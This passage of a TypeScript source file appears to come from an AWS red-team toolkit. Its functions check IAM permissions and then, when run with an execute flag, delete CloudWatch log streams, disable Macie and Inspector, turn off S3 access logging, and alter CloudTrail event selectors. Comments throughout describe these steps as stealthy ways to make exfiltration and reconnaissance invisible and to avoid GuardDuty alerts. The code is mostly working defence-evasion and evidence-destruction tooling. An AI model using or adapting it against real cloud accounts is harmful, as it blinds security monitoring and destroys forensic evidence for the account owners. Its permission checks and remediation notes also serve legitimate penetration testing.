        output.push(`\n[+] DRY RUN — would delete ${stl.length} stream(s) from: ${name}`)
        findings.push({ checkId: "AWS-EVASION-013", provider: "aws", severity: "critical", status: "READY", resource: `cloudwatch:streams:${name}`, title: `Stream deletion viable: ${stl.length} streams in ${name}`, details: "DeleteLogStream allowed — evidence can be selectively removed while group persists", remediation: "Restrict logs:DeleteLogStream" })
        return { output: output.join("\n"), findings }
      }
      let deleted = 0
      for (const st of stl) {
        const d = await aws(["logs", "delete-log-stream", "--log-group-name", name, "--log-stream-name", st], profile, region, timeout)
        if (d.exitCode === 0) deleted++
      }
      output.push(`[+] Deleted ${deleted}/${stl.length} log streams from ${name}`)
      if (deleted > 0) {
        findings.push({ checkId: "AWS-EVASION-013", provider: "aws", severity: "critical", status: "DELETED", resource: `cloudwatch:streams:${name}`, title: `${deleted} log streams deleted from ${name}`, details: "Log streams permanently destroyed — group exists but evidence removed. CloudTrail event: DeleteLogStream", remediation: "Log data cannot be recovered — investigate timeline and restore from backups" })
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function macieDisable(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const action = argVal(args, "--action") || "status"
  const execute = hasFlag(args, "--execute")
  const findings: Finding[] = []
  const output: string[] = ["[*] Amazon Macie — Sensitive Data Discovery Evasion\n"]

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["macie2:GetMacieSession", "macie2:UpdateMacieSession", "macie2:DisableMacie"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: UpdateMacieSession, DisableMacie`)
  output.push(`[*] Detection: Macie finding count drops, org admin sees member status change`)

  const session = await aws(["macie2", "get-macie-session"], profile, region, timeout)
  if (session.exitCode !== 0) {
    output.push("\n[-] Macie not enabled or access denied")
    return { output: output.join("\n"), findings }
  }

  const s = tryJson(session.stdout) || {}
  output.push(`\n[+] Macie status: ${s.status}`)
  output.push(`  Created: ${s.createdAt}`)
  output.push(`  Service role: ${s.serviceRole}`)
  output.push(`  Finding publishing: ${s.findingPublishingFrequency}`)

  const admin = await aws(["macie2", "get-administrator-account"], profile, region, timeout)
  if (admin.exitCode === 0) {
    const adm = tryJson(admin.stdout)?.administrator
    if (adm?.accountId) output.push(`  [!] Org admin: ${adm.accountId} (${adm.relationshipStatus}) — disable may be blocked`)
  }

  const buckets = await aws(["macie2", "describe-buckets", "--query", "buckets | length(@)"], profile, region, timeout)
  if (buckets.exitCode === 0) output.push(`  Monitored buckets: ${tryJson(buckets.stdout) || 0}`)

  const jobs = await aws(["macie2", "list-classification-jobs", "--query", "items[].[jobId,name,jobStatus,jobType]"], profile, region, timeout)
  if (jobs.exitCode === 0) {
    const jl = tryJson(jobs.stdout) || []
    output.push(`  Classification jobs: ${jl.length}`)
    const running = (jl as string[][]).filter(j => j[2] === "RUNNING")
    if (running.length > 0) output.push(`  [!] ${running.length} job(s) currently running`)
    for (const j of (jl as string[][]).slice(0, 10)) output.push(`    ${j[1]} (${j[0]}) Status: ${j[2]} Type: ${j[3]}`)
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("macie2:UpdateMacieSession")) viable.push("suspend")
    if (allowed.has("macie2:DisableMacie")) viable.push("disable")
    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
    output.push(`[*] Use --action suspend|disable [--execute]`)
    return { output: output.join("\n"), findings }
  }

  if (action === "suspend") {
    if (!allowed.has("macie2:UpdateMacieSession")) {
      output.push(`\n[-] macie2:UpdateMacieSession DENIED — suspend blocked`)
      findings.push({ checkId: "AWS-EVASION-MACIE-001", provider: "aws", severity: "info", status: "BLOCKED", resource: "macie:session", title: "Macie suspend blocked", details: "Cannot pause Macie session", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    if (!execute) {
      output.push(`\n[+] DRY RUN — would suspend Macie session`)
      output.push(`  Effect: S3 sensitive data scanning paused, existing findings retained`)
      findings.push({ checkId: "AWS-EVASION-014", provider: "aws", severity: "critical", status: "READY", resource: "macie:session", title: "Macie suspend viable", details: "UpdateMacieSession allowed — sensitive data discovery can be paused", remediation: "Restrict macie2:UpdateMacieSession via SCP" })
      return { output: output.join("\n"), findings }
    }
    const r = await aws(["macie2", "update-macie-session", "--status", "PAUSED"], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`\n[+] Macie suspended — sensitive data discovery paused`)
      findings.push({ checkId: "AWS-EVASION-014", provider: "aws", severity: "critical", status: "SUSPENDED", resource: "macie:session", title: "Amazon Macie suspended", details: "S3 sensitive data discovery paused — new data won't be detected. CloudTrail event: UpdateMacieSession", remediation: "Resume: aws macie2 update-macie-session --status ENABLED" })
    }
  }

  if (action === "disable") {
    if (!allowed.has("macie2:DisableMacie")) {
      output.push(`\n[-] macie2:DisableMacie DENIED — disable blocked`)
      findings.push({ checkId: "AWS-EVASION-MACIE-002", provider: "aws", severity: "info", status: "BLOCKED", resource: "macie:session", title: "Macie disable blocked", details: "Cannot disable Macie", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    if (!execute) {
      output.push(`\n[+] DRY RUN — would permanently disable Macie`)
      output.push(`  Effect: all jobs stopped, findings deleted after 30 days, re-enable resets everything`)
      findings.push({ checkId: "AWS-EVASION-018", provider: "aws", severity: "critical", status: "READY", resource: "macie:session", title: "Macie disable viable", details: "DisableMacie allowed — all sensitive data classification will stop permanently", remediation: "Restrict macie2:DisableMacie via SCP" })
      return { output: output.join("\n"), findings }
    }
    const r = await aws(["macie2", "disable-macie"], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`\n[+] Macie disabled permanently`)
      findings.push({ checkId: "AWS-EVASION-018", provider: "aws", severity: "critical", status: "DISABLED", resource: "macie:session", title: "Amazon Macie disabled", details: "Macie permanently disabled — all classification jobs stopped, findings deleted after 30d. CloudTrail event: DisableMacie", remediation: "Re-enable: aws macie2 enable-macie" })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function inspectorDisable(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const action = argVal(args, "--action") || "status"
  const execute = hasFlag(args, "--execute")
  const findings: Finding[] = []
  const output: string[] = ["[*] Amazon Inspector — Vulnerability Scanning Evasion\n"]

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["inspector2:BatchGetAccountStatus", "inspector2:Disable", "inspector2:ListCoverage"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: Disable`)
  output.push(`[*] Detection: org delegated admin sees member status, Security Hub finding count drop`)

  const status = await aws(["inspector2", "batch-get-account-status", "--query", "accounts[0].{state:state,ec2:resourceState.ec2,ecr:resourceState.ecr,lambda:resourceState.lambda}"], profile, region, timeout)
  if (status.exitCode !== 0) {
    output.push("\n[-] Inspector v2 not enabled or access denied")
    return { output: output.join("\n"), findings }
  }

  const s = tryJson(status.stdout)
  output.push(`\n[+] Inspector status: ${s?.state?.status || "unknown"}`)
  const scanTypes: string[] = []
  if (s?.ec2) { output.push(`  EC2 scanning: ${s.ec2.status}`); if (s.ec2.status === "ENABLED") scanTypes.push("EC2") }
  if (s?.ecr) { output.push(`  ECR scanning: ${s.ecr.status}`); if (s.ecr.status === "ENABLED") scanTypes.push("ECR") }
  if (s?.lambda) { output.push(`  Lambda scanning: ${s.lambda.status}`); if (s.lambda.status === "ENABLED") scanTypes.push("LAMBDA") }

  const coverage = await aws(["inspector2", "list-coverage", "--query", "coveredResources | length(@)"], profile, region, timeout)
  if (coverage.exitCode === 0) output.push(`  Covered resources: ${tryJson(coverage.stdout) || 0}`)

  const findingsCount = await aws(["inspector2", "list-finding-aggregations", "--aggregation-type", "ACCOUNT", "--query", "responses[0].{critical:severityCounts.critical,high:severityCounts.high,medium:severityCounts.medium}"], profile, region, timeout)
  if (findingsCount.exitCode === 0) {
    const fc = tryJson(findingsCount.stdout)
    if (fc) output.push(`  Findings: Critical=${fc.critical || 0} High=${fc.high || 0} Medium=${fc.medium || 0}`)
  }

  const delegated = await aws(["inspector2", "list-delegated-admin-accounts", "--query", "delegatedAdminAccounts[].[accountId,status]"], profile, region, timeout)
  if (delegated.exitCode === 0) {
    const dl = tryJson(delegated.stdout) || []
    if (dl.length > 0) {
      output.push(`  [!] Delegated admin account(s): ${(dl as string[][]).map(d => d[0]).join(", ")} — they see member status changes`)
    }
  }

  if (action === "status") {
    output.push(`\n[*] Currently scanning: ${scanTypes.length > 0 ? scanTypes.join(", ") : "NONE"}`)
    output.push(`[*] Viable: ${allowed.has("inspector2:Disable") ? "disable" : "NONE — disable blocked"}`)
    output.push(`[*] Use --action disable [--execute]`)
    return { output: output.join("\n"), findings }
  }

  if (action === "disable") {
    if (!allowed.has("inspector2:Disable")) {
      output.push(`\n[-] inspector2:Disable DENIED — disable blocked`)
      findings.push({ checkId: "AWS-EVASION-INSP-001", provider: "aws", severity: "info", status: "BLOCKED", resource: "inspector:scanning", title: "Inspector disable blocked", details: "Cannot disable vulnerability scanning", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    const types = ["EC2", "ECR", "LAMBDA", "LAMBDA_CODE"]
    if (!execute) {
      output.push(`\n[+] DRY RUN — would disable scanning for: ${types.join(", ")}`)
      output.push(`  Effect: ${scanTypes.join(", ")} scanning stops, existing findings retained for 30d`)
      findings.push({ checkId: "AWS-EVASION-015", provider: "aws", severity: "critical", status: "READY", resource: "inspector:scanning", title: "Inspector disable viable", details: `inspector2:Disable allowed — can stop vulnerability scanning for ${scanTypes.join(", ")}`, remediation: "Restrict inspector2:Disable via SCP" })
      return { output: output.join("\n"), findings }
    }
    const r = await aws(["inspector2", "disable", "--resource-types", ...types], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`\n[+] Inspector disabled for: ${types.join(", ")}`)
      findings.push({ checkId: "AWS-EVASION-015", provider: "aws", severity: "critical", status: "DISABLED", resource: "inspector:scanning", title: "Amazon Inspector vulnerability scanning disabled", details: `Disabled scanning for ${types.join(", ")} — new vulnerabilities undetected. CloudTrail event: Disable`, remediation: `Re-enable: aws inspector2 enable --resource-types ${types.join(" ")}` })
    } else {
      const partial = await aws(["inspector2", "disable", "--resource-types", "EC2", "ECR"], profile, region, timeout)
      if (partial.exitCode === 0) {
        output.push(`[+] Inspector partially disabled (EC2, ECR) — LAMBDA types may not be available in this region`)
        findings.push({ checkId: "AWS-EVASION-019", provider: "aws", severity: "critical", status: "DISABLED", resource: "inspector:scanning", title: "Amazon Inspector scanning disabled (EC2, ECR)", details: "EC2 and ECR vulnerability scanning disabled. CloudTrail event: Disable", remediation: "Re-enable: aws inspector2 enable --resource-types EC2 ECR" })
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function s3LoggingDisable(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const action = argVal(args, "--action") || "status"
  const bucket = argVal(args, "--bucket")
  const execute = hasFlag(args, "--execute")
  const findings: Finding[] = []
  const output: string[] = ["[*] S3 Access Logging & Object-Level CloudTrail\n"]

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["s3:ListAllMyBuckets", "s3:GetBucketLogging", "s3:PutBucketLogging", "cloudtrail:PutEventSelectors"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: PutBucketLogging, PutEventSelectors`)
  output.push(`[*] Detection: Config rule for S3 logging, CloudWatch metric on S3 request count`)

  const buckets = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
  if (buckets.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: s3:ListBuckets", findings }

  const bl = tryJson(buckets.stdout) || []
  const targets = bucket ? bl.filter((b: string) => b === bucket) : bl

  output.push(`\n[+] Checking ${targets.length} buckets for access logging...`)

  for (const b of targets) {
    const logging = await aws(["s3api", "get-bucket-logging", "--bucket", b], profile, region, timeout)
    if (logging.exitCode === 0) {
      const l = tryJson(logging.stdout)
      if (l?.LoggingEnabled) {
        output.push(`  ${b}: ACCESS LOGGING → ${l.LoggingEnabled.TargetBucket}/${l.LoggingEnabled.TargetPrefix || ""}`)
        findings.push({
          checkId: "AWS-EVASION-020",
          provider: "aws",
          severity: "info",
          status: "ENABLED",
          resource: `s3:logging:${b}`,
          title: `S3 access logging enabled: ${b}`,
          details: `Logs to ${l.LoggingEnabled.TargetBucket} — s3_dump/s3_exfil activity will be recorded`,
          remediation: "Access logging is a security control — do not disable without reason",
        })
      } else {
        output.push(`  ${b}: no access logging`)
      }
    }
  }

  const trails = await aws(
    ["cloudtrail", "describe-trails", "--query", "trailList[].[Name,S3BucketName,HasCustomEventSelectors]"],
    profile,
    region,
    timeout,
  )
  if (trails.exitCode === 0) {
    const tl = tryJson(trails.stdout) || []
    output.push(`\n[+] CloudTrail trails with event selectors:`)
    for (const t of tl) {
      if (t[2]) {
        const selectors = await aws(
          ["cloudtrail", "get-event-selectors", "--trail-name", t[0]],
          profile,
          region,
          timeout,
        )
        if (selectors.exitCode === 0) {
          const s = tryJson(selectors.stdout)
          const advanced = s?.AdvancedEventSelectors || []
          const basic = s?.EventSelectors || []

          for (const es of basic) {
            const s3data = (es.DataResources || []).filter((d: Record<string, string>) => d.Type === "AWS::S3::Object")
            if (s3data.length) {
              output.push(`  Trail ${t[0]}: S3 object-level logging (${es.ReadWriteType})`)
              for (const d of s3data) {
                output.push(`    Resources: ${(d.Values || []).join(", ")}`)
              }
              findings.push({
                checkId: "AWS-EVASION-021",
                provider: "aws",
                severity: "info",
                status: "ENABLED",
                resource: `cloudtrail:s3data:${t[0]}`,
                title: `S3 object-level CloudTrail on trail: ${t[0]}`,
                details: `${es.ReadWriteType} events — GetObject/PutObject will appear in CloudTrail`,
                remediation: "Object-level logging records all S3 data access",
              })
            }
          }

          for (const ae of advanced) {
            const s3match = (ae.FieldSelectors || []).some(
              (f: Record<string, unknown>) =>
                f.Field === "resources.type" && Array.isArray(f.Equals) && f.Equals.includes("AWS::S3::Object"),
            )
            if (s3match) {
              output.push(`  Trail ${t[0]}: Advanced S3 object-level selector: ${ae.Name || "unnamed"}`)
            }
          }
        }
      }
    }
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("s3:PutBucketLogging")) viable.push("disable_access_log")
    if (allowed.has("cloudtrail:PutEventSelectors")) viable.push("disable_data_events")
    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
    output.push(`[*] Use --action disable_access_log|disable_data_events [--bucket <name>] [--execute]`)
    return { output: output.join("\n"), findings }
  }

  if (action === "disable_access_log") {
    if (!allowed.has("s3:PutBucketLogging")) {
      output.push(`\n[-] s3:PutBucketLogging DENIED — access log disable blocked`)
      findings.push({ checkId: "AWS-EVASION-S3-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "S3 access log disable blocked", details: "Cannot modify bucket logging", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    const targetBuckets = bucket ? [bucket] : (targets as string[]).slice(0, 10)
    if (!execute) {
      output.push(`\n[+] DRY RUN — would disable access logging on ${targetBuckets.length} bucket(s):`)
      for (const b of targetBuckets) output.push(`  ${b}`)
      findings.push({ checkId: "AWS-EVASION-016", provider: "aws", severity: "critical", status: "READY", resource: `s3:logging:${targetBuckets.length}`, title: `S3 access log disable viable: ${targetBuckets.length} buckets`, details: "PutBucketLogging allowed — data access activity will become invisible", remediation: "Restrict s3:PutBucketLogging via SCP" })
      return { output: output.join("\n"), findings }
    }
    for (const b of targetBuckets) {
      const r = await aws(["s3api", "put-bucket-logging", "--bucket", b, "--bucket-logging-status", "{}"], profile, region, timeout)
      if (r.exitCode === 0) {
        output.push(`[+] Access logging disabled: ${b}`)
        findings.push({ checkId: "AWS-EVASION-016", provider: "aws", severity: "critical", status: "DISABLED", resource: `s3:logging:${b}`, title: `S3 access logging disabled: ${b}`, details: "Bucket access no longer recorded — exfil invisible. CloudTrail event: PutBucketLogging", remediation: `Re-enable: aws s3api put-bucket-logging --bucket ${b} --bucket-logging-status '{"LoggingEnabled":{"TargetBucket":"LOG_BUCKET"}}'` })
      }
    }
  }

  if (action === "disable_data_events") {
    const trailsList =
      tryJson(
        (await aws(["cloudtrail", "describe-trails", "--query", "trailList[].Name"], profile, region, timeout)).stdout,
      ) || []
    for (const trail of trailsList) {
      const selectors = await aws(
        ["cloudtrail", "get-event-selectors", "--trail-name", trail],
        profile,
        region,
        timeout,
      )
      if (selectors.exitCode === 0) {
        const s = tryJson(selectors.stdout)
        const basic = s?.EventSelectors || []
        const hasS3 = basic.some((es: Record<string, Record<string, string>[]>) =>
          (es.DataResources || []).some((d) => d.Type === "AWS::S3::Object"),
        )
        if (hasS3) {
          const cleaned = basic.map((es: Record<string, Record<string, string>[]>) => ({
            ...es,
            DataResources: (es.DataResources || []).filter((d) => d.Type !== "AWS::S3::Object"),
          }))
          const r = await aws(
            ["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(cleaned)],
            profile,
            region,
            timeout,
          )
          if (r.exitCode === 0) {
            output.push(`[+] S3 data events removed from trail: ${trail}`)
            findings.push({
              checkId: "AWS-EVASION-017",
              provider: "aws",
              severity: "critical",
              status: "DISABLED",
              resource: `cloudtrail:s3data:${trail}`,
              title: `S3 object-level CloudTrail disabled: ${trail}`,
              details: "S3 GetObject/PutObject no longer logged — data exfiltration invisible in CloudTrail",
              remediation: "Re-add S3 data event selectors to CloudTrail trail",
            })
          }
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function cloudtrailSelectorTamper(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action")
  if (!action) return { output: "ERROR: --action required (status|exclude_kms|exclude_s3_data|management_read_only|restore)", findings: [] }
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const trailName = argVal(args, "--trail-name")
  const execute = hasFlag(args, "--execute")
  const findings: Finding[] = []
  const output: string[] = ["[*] CloudTrail Event Selector Manipulation (stealth evasion)\n"]

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["cloudtrail:DescribeTrails", "cloudtrail:GetEventSelectors", "cloudtrail:PutEventSelectors"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: PutEventSelectors (ironic — logged by the thing we're modifying)`)
  output.push(`[*] Stealth: selector tampering does NOT trigger GuardDuty (unlike StopLogging)`)
  output.push(`[*] This is the preferred technique over cloudtrail_blind stop — harder to detect`)

  const resolveTrail = async (): Promise<string | null> => {
    if (trailName) return trailName
    const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
    const name = tryJson(r.stdout)
    if (!name || r.exitCode !== 0) { output.push("[-] No CloudTrail trails found"); return null }
    return name as string
  }

  if (action === "status") {
    const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[].Name"], profile, region, timeout)
    const trails = tryJson(r.stdout) || []
    for (const t of trails) {
      const sel = await aws(["cloudtrail", "get-event-selectors", "--trail-name", t], profile, region, timeout)
      const data = tryJson(sel.stdout)
      if (!data) continue
      output.push(`\n[+] Trail: ${t}`)
      const selectors = data.EventSelectors || []
      for (const s of selectors as Record<string, unknown>[]) {
        output.push(`  ReadWriteType: ${s.ReadWriteType}`)
        output.push(`  IncludeManagementEvents: ${s.IncludeManagementEvents}`)
        const excludes = (s.ExcludeManagementEventSources || []) as string[]
        output.push(`  ExcludedSources: ${excludes.length > 0 ? excludes.join(", ") : "(none)"}`)
        const dataRes = (s.DataResources || []) as Record<string, string>[]
        output.push(`  DataResources: ${dataRes.length > 0 ? dataRes.map(d => d.Type).join(", ") : "(none)"}`)

        const gaps: string[] = []
        if (s.ReadWriteType !== "All") gaps.push(`ReadWriteType=${s.ReadWriteType} (not All)`)
        if (s.IncludeManagementEvents === false) gaps.push("ManagementEvents=false")
        if (excludes.length > 0) gaps.push(`Excluded: ${excludes.join(",")}`)
        if (gaps.length > 0) output.push(`  [!] Existing blind spots: ${gaps.join("; ")}`)
      }
      const advanced = data.AdvancedEventSelectors || []
      if (advanced.length > 0) output.push(`  AdvancedEventSelectors: ${advanced.length} rule(s)`)
    }

    const viable: string[] = []
    if (allowed.has("cloudtrail:PutEventSelectors")) {
      viable.push("exclude_kms", "exclude_s3_data", "management_read_only", "restore")
    }
    output.push(`\n[*] Viable: ${viable.length > 0 ? viable.join(", ") : "NONE — PutEventSelectors blocked"}`)
    output.push(`[*] Use --action exclude_kms|exclude_s3_data|management_read_only|restore [--trail-name <name>] [--execute]`)
    return { output: output.join("\n"), findings }
  }

  if (!allowed.has("cloudtrail:PutEventSelectors")) {
    output.push(`\n[-] cloudtrail:PutEventSelectors DENIED — all selector manipulation blocked`)
    findings.push({ checkId: "AWS-EVASION-SEL-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudTrail selector tampering blocked", details: "Cannot modify event selectors", remediation: "N/A" })
    return { output: output.join("\n"), findings }
  }

  const trail = await resolveTrail()
  if (!trail) return { output: output.join("\n"), findings }

  const current = await aws(["cloudtrail", "get-event-selectors", "--trail-name", trail], profile, region, timeout)
  const currentData = tryJson(current.stdout)
  const selectors = currentData?.EventSelectors || [{ ReadWriteType: "All", IncludeManagementEvents: true }]

  if (action === "exclude_kms") {
    const updated = (selectors as Record<string, unknown>[]).map(s => ({ ...s, ExcludeManagementEventSources: ["kms.amazonaws.com"] }))
    if (!execute) {
      output.push(`\n[+] DRY RUN — would exclude KMS events from: ${trail}`)
      output.push(`  Effect: Decrypt, Encrypt, GenerateDataKey calls invisible — reduces noise AND hides crypto operations`)
      findings.push({ checkId: "AWS-EVASION-SEL-KMS", provider: "aws", severity: "high", status: "READY", resource: trail, title: `KMS exclusion viable on: ${trail}`, details: "PutEventSelectors allowed — KMS API calls can be hidden from CloudTrail", remediation: "Monitor PutEventSelectors calls, enforce full logging via SCP" })
      return { output: output.join("\n"), findings }
    }
    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)], profile, region, timeout)
    output.push(r.exitCode === 0 ? `[+] KMS operations excluded from ${trail} — KMS API calls no longer logged` : `[-] Failed: ${r.stderr.slice(0, 200)}`)
    if (r.exitCode === 0) findings.push({ checkId: "AWS-EVASION-SEL-KMS", provider: "aws", severity: "high", status: "TAMPERED", resource: trail, title: `KMS events excluded from: ${trail}`, details: "KMS Decrypt/Encrypt/GenerateDataKey invisible. CloudTrail event: PutEventSelectors", remediation: "Remove ExcludeManagementEventSources from event selectors" })
  }

  if (action === "exclude_s3_data") {
    const updated = (selectors as Record<string, unknown>[]).map(s => ({ ...s, DataResources: [] }))
    if (!execute) {
      output.push(`\n[+] DRY RUN — would remove S3 data events from: ${trail}`)
      output.push(`  Effect: s3:GetObject/PutObject no longer logged — data exfil invisible`)
      findings.push({ checkId: "AWS-EVASION-SEL-S3", provider: "aws", severity: "critical", status: "READY", resource: trail, title: `S3 data event removal viable on: ${trail}`, details: "Can remove S3 object-level logging — data exfiltration becomes invisible", remediation: "Monitor PutEventSelectors, enforce S3 data events via SCP" })
      return { output: output.join("\n"), findings }
    }
    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)], profile, region, timeout)
    output.push(r.exitCode === 0 ? `[+] S3 data events removed from ${trail} — s3:GetObject/PutObject no longer logged` : `[-] Failed: ${r.stderr.slice(0, 200)}`)
    if (r.exitCode === 0) findings.push({ checkId: "AWS-EVASION-SEL-S3", provider: "aws", severity: "critical", status: "TAMPERED", resource: trail, title: `S3 data events removed from: ${trail}`, details: "s3:GetObject/PutObject invisible — exfil undetectable. CloudTrail event: PutEventSelectors", remediation: "Re-add S3 data event selectors" })
  }

  if (action === "management_read_only") {
    const updated = (selectors as Record<string, unknown>[]).map(s => ({ ...s, ReadWriteType: "WriteOnly" }))
    if (!execute) {
      output.push(`\n[+] DRY RUN — would set WriteOnly on: ${trail}`)
      output.push(`  Effect: List*/Get*/Describe* calls invisible — all recon becomes undetectable`)
      findings.push({ checkId: "AWS-EVASION-SELECTOR-001", provider: "aws", severity: "high", status: "READY", resource: trail, title: `Management event filtering viable on: ${trail}`, details: "Can hide all read API calls — recon is invisible while write events still logged (lower suspicion)", remediation: "Restore ReadWriteType to All, enforce via SCP" })
      return { output: output.join("\n"), findings }
    }
    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)], profile, region, timeout)
    output.push(r.exitCode === 0 ? `[+] Management events set to WriteOnly on ${trail} — List*/Get*/Describe* invisible` : `[-] Failed: ${r.stderr.slice(0, 200)}`)
    if (r.exitCode === 0) findings.push({ checkId: "AWS-EVASION-SELECTOR-001", provider: "aws", severity: "high", status: "TAMPERED", resource: trail, title: "CloudTrail selectors modified to WriteOnly", details: "Read-only API calls invisible — recon undetectable. CloudTrail event: PutEventSelectors", remediation: "Restore ReadWriteType to All" })
  }

  if (action === "restore") {
    const restored = [{ ReadWriteType: "All", IncludeManagementEvents: true, DataResources: [], ExcludeManagementEventSources: [] }]
    if (!execute) {
      output.push(`\n[+] DRY RUN — would restore full logging on: ${trail}`)
      return { output: output.join("\n"), findings }
    }
    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(restored)], profile, region, timeout)
    output.push(r.exitCode === 0 ? `[+] Event selectors restored to full logging on ${trail}` : `[-] Failed: ${r.stderr.slice(0, 200)}`)
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: PutEventSelectors, GetEventSelectors, DescribeTrails`)
  output.push(`  GuardDuty: N/A — selector changes do NOT trigger GuardDuty (unlike StopLogging)`)
  output.push(`  OPSEC: PutEventSelectors IS logged by CloudTrail before the change takes effect — attacker's own modification is visible`)
  output.push(`  OPSEC: preferred over StopLogging because no GuardDuty Stealth finding fires; only Config rules and custom CloudWatch alerts catch it`)
  output.push(`  OPSEC: exclude_kms is lowest-signal (common for noise reduction); management_read_only is moderate; exclude_s3_data is high-signal`)

  return { output: output.join("\n"), findings }
}
